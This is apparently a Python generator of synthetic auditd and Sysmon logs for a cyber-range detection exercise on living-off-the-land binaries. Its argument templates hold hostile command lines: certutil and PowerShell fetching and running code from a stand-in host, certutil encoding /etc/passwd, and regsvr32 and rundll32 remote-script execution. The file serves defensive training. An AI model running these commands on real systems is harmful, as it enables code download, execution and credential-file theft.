"""LOLBAS (Living Off The Land Binaries And Scripts) 사용 로그 generator.

Linux auditd execve 형식 (현 cyber range 가 Linux 베이스). Windows Sysmon EventID 1
형식도 옵션으로 제공. 기간 동안 분산된 *합법적-처럼 보이는* 명령 호출 패턴 생성.

학습 목표: 단발 호출은 정상이지만 *누적 패턴* 이 비정상 (장기 저밀도 베이스라인 이탈).

Examples:
    LOLBAS 6개월 시뮬:
        gen = generate(seed=42, duration_days=180, binaries={
            "certutil": 7,    # 월 7건
            "powershell": 18,
            "wmic": 3,
        })
        with open("/tmp/audit.log", "w") as f:
            for line in gen:
                f.write(line + "\\n")
"""
from __future__ import annotations
import random
from datetime import datetime, timedelta
from typing import Iterator


_BENIGN_PARENT = ["bash", "sshd", "cron", "systemd", "explorer.exe"]
_LOLBAS_VARIANTS = {
    # binary -> [정상으로 보이는 인자 패턴]
    "certutil": [
        "-decode -f /tmp/x.b64 /tmp/x.exe",
        "-urlcache -split -f https://upd.example.com/patch.bin /tmp/p.bin",
        "-encode /etc/passwd /tmp/p.b64",
    ],
    "powershell": [
        "-NoP -W Hidden -Enc {b64}",
        "-c \"IEX(New-Object Net.WebClient).DownloadString('https://upd.example.com/s.ps1')\"",
        "-EncodedCommand {b64}",
    ],
    "wmic": [
        "process call create \"cmd.exe /c c:\\\\temp\\\\u.bat\"",
        "process get name,executablepath",
        "/node:127.0.0.1 process list brief",
    ],
    "regsvr32": [
        "/s /n /u /i:https://upd.example.com/x.sct scrobj.dll",
    ],
    "rundll32": [
        "javascript:\"\\\\..\\\\mshtml,RunHTMLApplication \";document.write();",
        "shell32.dll,Control_RunDLL",
    ],
}
_USERS = ["webadmin", "ccc", "appuser", "svc-monitor"]


def _b64(rng: random.Random, n: int = 80) -> str:
    """가짜 base64 문자열 (학생 grep 매칭용)."""
    chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    return "".join(rng.choice(chars) for _ in range(n)) + "=="


def _ts(start: datetime, day_offset: int, rng: random.Random) -> datetime:
    """업무시간 가중 (09-18 70%, 야간 30%) timestamp."""
    if rng.random() < 0.7:
        hour = rng.randint(9, 18)
    else:
        hour = rng.choice([0, 1, 2, 3, 19, 20, 21, 22, 23])
    return start + timedelta(days=day_offset, hours=hour, minutes=rng.randint(0, 59),
                              seconds=rng.randint(0, 59))


def _auditd_line(ts: datetime, user: str, parent: str, binary: str, args: str,
                 pid: int) -> str:
    """auditd execve 형식 (단순화)."""
    epoch = int(ts.timestamp())
    return (f"type=EXECVE msg=audit({epoch}.{rng_ms()}:{pid}): argc=2 "
            f"a0=\"{binary}\" a1=\"{args[:100]}\" "
            f"comm=\"{binary}\" exe=\"/usr/bin/{binary}\" "
            f"uid={1000 + hash(user) % 1000} user=\"{user}\" "
            f"ppid={pid - 1} pcomm=\"{parent}\"")


_RNG_MS_COUNTER = [0]


def rng_ms() -> str:
    _RNG_MS_COUNTER[0] = (_RNG_MS_COUNTER[0] + 173) % 1000
    return f"{_RNG_MS_COUNTER[0]:03d}"


def generate(seed: int = 42, duration_days: int = 180,
             binaries: dict[str, int] | None = None,
             format: str = "auditd",
             start: datetime | None = None) -> Iterator[str]:
    """LOLBAS 사용 로그 생성.

    Args:
        seed: 재현 가능한 시드.
        duration_days: 총 기간 (180 = 6개월).
        binaries: {binary_name: events_per_month} dict.
            기본: certutil 7, powershell 18, wmic 3 (LOLBAS 장기 저밀도).
        format: "auditd" (Linux) 또는 "sysmon" (Windows).
        start: 시작 시각 (기본: 오늘 - duration_days).

    Yields:
        각 이벤트의 한 줄 (auditd type=EXECVE 또는 Sysmon JSON).
    """
    binaries = binaries or {"certutil": 7, "powershell": 18, "wmic": 3}
    start = start or (datetime.utcnow() - timedelta(days=duration_days))

    rng = random.Random(seed)
    pid_counter = 12000

    # 각 binary 별 이벤트 분산 (월별 events 를 일별로 Poisson-like)
    events: list[tuple[datetime, str, str, str]] = []  # (ts, user, parent, binary, args)
    months = max(1, duration_days // 30)
    total_per_bin = {b: cnt * months for b, cnt in binaries.items()}

    for binary, total in total_per_bin.items():
        if binary not in _LOLBAS_VARIANTS:
            continue
        for _ in range(total):
            day = rng.randint(0, duration_days - 1)
            ts = _ts(start, day, rng)
            user = rng.choice(_USERS)
            parent = rng.choice(_BENIGN_PARENT)
            args_template = rng.choice(_LOLBAS_VARIANTS[binary])
            args = args_template.replace("{b64}", _b64(rng))
            events.append((ts, user, parent, binary, args))

    # 시간순 정렬 — 학생이 grep 시 시간순 정상으로 나오도록
    events.sort(key=lambda e: e[0])

    for ts, user, parent, binary, args in events:
        pid_counter += rng.randint(1, 5)
        if format == "sysmon":
            yield _sysmon_json(ts, user, parent, binary, args, pid_counter)
        else:
            yield _auditd_line(ts, user, parent, binary, args, pid_counter)


def _sysmon_json(ts: datetime, user: str, parent: str, binary: str, args: str,
                 pid: int) -> str:
    """Windows Sysmon EventID 1 (process create) JSON 형식."""
    import json
    return json.dumps({
        "EventID": 1,
        "TimeCreated": ts.isoformat() + "Z",
        "User": user,
        "ParentImage": f"C:\\Windows\\System32\\{parent}",
        "Image": f"C:\\Windows\\System32\\{binary}.exe",
        "CommandLine": f"{binary} {args}",
        "ProcessId": pid,
        "ParentProcessId": pid - 1,
    })


if __name__ == "__main__":
    # 자가 테스트 — 6개월 LOLBAS 5건 샘플
    for line in list(generate(seed=42, duration_days=180))[:5]:
        print(line)
